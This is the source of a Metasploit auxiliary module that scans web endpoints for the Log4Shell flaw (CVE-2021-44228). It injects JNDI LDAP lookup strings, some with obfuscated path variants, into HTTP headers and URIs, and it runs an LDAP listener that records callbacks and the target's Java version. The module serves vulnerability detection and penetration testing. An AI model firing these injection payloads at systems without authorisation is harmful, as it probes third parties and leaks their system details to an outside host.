##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::TcpServer
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name' => 'Log4Shell HTTP Scanner',
      'Description' => %q{
        This module will scan an HTTP end point for the Log4Shell vulnerability by injecting a format message that will
        trigger an LDAP connection to Metasploit. This module is a generic scanner and is only capable of identifying
        instances that are vulnerable via one of the pre-determined HTTP request injection points. These points include
        HTTP headers and the HTTP request path.
      },
      'Author' => [
        'Spencer McIntyre'
      ],
      'References' => [
        [ 'CVE', '2021-44228' ],
        [ 'URL', 'https://attackerkb.com/topics/in9sPR2Bzt/cve-2021-44228-log4shell/rapid7-analysis' ]
      ],
      'DisclosureDate' => '2021-12-09',
      'License' => MSF_LICENSE,
      'DefaultOptions' => {
        'SRVPORT' => 389
      },
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'SideEffects' => [IOC_IN_LOGS],
        'AKA' => ['Log4Shell', 'LogJam'],
        'Reliability' => []
      }
    )

    register_options([
      OptString.new('HTTP_METHOD', [ true, 'The HTTP method to use', 'GET' ]),
      OptString.new('TARGETURI', [ true, 'The URI to scan', '/']),
      OptPath.new('HEADERS_FILE', [
        false, 'File containing headers to check',
        File.join(Msf::Config.data_directory, 'exploits', 'CVE-2021-44228', 'http_headers.txt')
      ]),
      OptPath.new('URIS_FILE', [ false, 'File containing additional URIs to check' ]),
      OptInt.new('LDAP_TIMEOUT', [ true, 'Time in seconds to wait to receive LDAP connections', 30 ])
    ])
  end

  def jndi_string(resource)
    "${jndi:ldap://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}/#{resource}/${sys:java.vendor}_${sys:java.version}}"
  end

  def on_client_connect(client)
    client.extend(Net::BER::BERParser)
    pdu = Net::LDAP::PDU.new(client.read_ber(Net::LDAP::AsnSyntax))
    return unless pdu.app_tag == Net::LDAP::PDU::BindRequest

    response = [
      pdu.message_id.to_ber,
      [
        Net::LDAP::ResultCodeSuccess.to_ber_enumerated, ''.to_ber, ''.to_ber
      ].to_ber_appsequence(Net::LDAP::PDU::BindResult)
    ].to_ber_sequence
    client.write(response)

    pdu = Net::LDAP::PDU.new(client.read_ber(Net::LDAP::AsnSyntax))
    return unless pdu.app_tag == Net::LDAP::PDU::SearchRequest

    base_object = pdu.search_parameters[:base_object].to_s
    token, java_version = base_object.split('/', 2)

    target_info = @mutex.synchronize { @tokens.delete(token) }
    if target_info
      details = normalize_uri(target_info[:target_uri]).to_s
      details << " (header: #{target_info[:headers].keys.first})" unless target_info[:headers].nil?
      details << " (java: #{java_version})" unless java_version.blank?
      peerinfo = "#{target_info[:rhost]}:#{target_info[:rport]}"
      print_good("#{peerinfo.ljust(21)} - Log4Shell found via #{details}")
      report_vuln(
        host: target_info[:rhost],
        port: target_info[:rport],
        info: "Module #{fullname} detected Log4Shell vulnerability via #{details}",
        name: name,
        refs: references
      )
    end
  rescue Net::LDAP::PDU::Error => e
    vprint_error("#{peer} - #{e}")
  ensure
    service.close_client(client)
  end

  def rand_text_alpha_lower_numeric(len, bad = '')
    foo = []
    foo += ('a'..'z').to_a
    foo += ('0'..'9').to_a
    Rex::Text.rand_base(len, bad, *foo)
  end

  def run
    fail_with(Failure::BadConfig, 'The SRVHOST option must be set to a routable IP address.') if ['0.0.0.0', '::'].include?(datastore['SRVHOST'])
    @mutex = Mutex.new
    @tokens = {}
    # always disable SSL because the LDAP server doesn't use it but the setting is shared with the HTTP requests
    begin
      start_service('SSL' => false)
    rescue Rex::BindFailed => e
      fail_with(Failure::BadConfig, e.to_s)
    end

    super

    print_status("Sleeping #{datastore['LDAP_TIMEOUT']} seconds for any last LDAP connections")
    sleep datastore['LDAP_TIMEOUT']
  ensure
    stop_service
  end

  def replicant
    #
    # WARNING: This is a horrible pattern and should not be copy-pasted into new code. A better solution is currently
    # in the works to address service / socket replication as it affects scanner modules.
    #
    service = @service
    @service = nil
    obj = super
    @service = service

    # but do copy the tokens and mutex to the new object
    obj.mutex = @mutex
    obj.tokens = @tokens
    obj
  end

  def run_host(ip)
    # probe the target before continuing
    return if send_request_cgi('uri' => normalize_uri(target_uri)).nil?

    run_host_uri(ip, normalize_uri(target_uri)) unless target_uri.blank?

    return if datastore['URIS_FILE'].blank?

    File.open(datastore['URIS_FILE'], 'rb').each_line(chomp: true) do |uri|
      next if uri.blank? || uri.start_with?('#')

      if uri.include?('${jndi:uri}')
        token = rand_text_alpha_lower_numeric(8..32)
        jndi = jndi_string(token)
        uri.delete_prefix!('/')
        test(token, uri: normalize_uri(target_uri, '') + uri.gsub('${jndi:uri}', Rex::Text.uri_encode(jndi)))
      else
        run_host_uri(ip, normalize_uri(target_uri, uri))
      end
    end
  end

  def run_host_uri(_ip, uri)
    unless datastore['HEADERS_FILE'].blank?
      headers_file = File.open(datastore['HEADERS_FILE'], 'rb')
      headers_file.each_line(chomp: true) do |header|
        next if header.blank? || header.start_with?('#')

        token = rand_text_alpha_lower_numeric(8..32)
        test(token, uri: uri, headers: { header => jndi_string(token) })
      end
    end

    token = rand_text_alpha_lower_numeric(8..32)
    jndi = jndi_string(token)
    test(token, uri: normalize_uri(uri, Rex::Text.uri_encode(jndi.gsub('ldap://', 'ldap:${::-/}/')), '/'))

    token = rand_text_alpha_lower_numeric(8..32)
    jndi = jndi_string(token)
    test(token, uri: normalize_uri(uri, Rex::Text.uri_encode(jndi.gsub('ldap://', 'ldap:${::-/}/'))))
  end

  def test(token, uri: nil, headers: nil)
    target_info = {
      rhost: rhost,
      rport: rport,
      target_uri: uri,
      headers: headers
    }
    @mutex.synchronize { @tokens[token] = target_info }

    send_request_raw(
      'uri' => uri,
      'method' => datastore['HTTP_METHOD'],
      'headers' => headers
    )
  end

  attr_accessor :mutex, :tokens
end
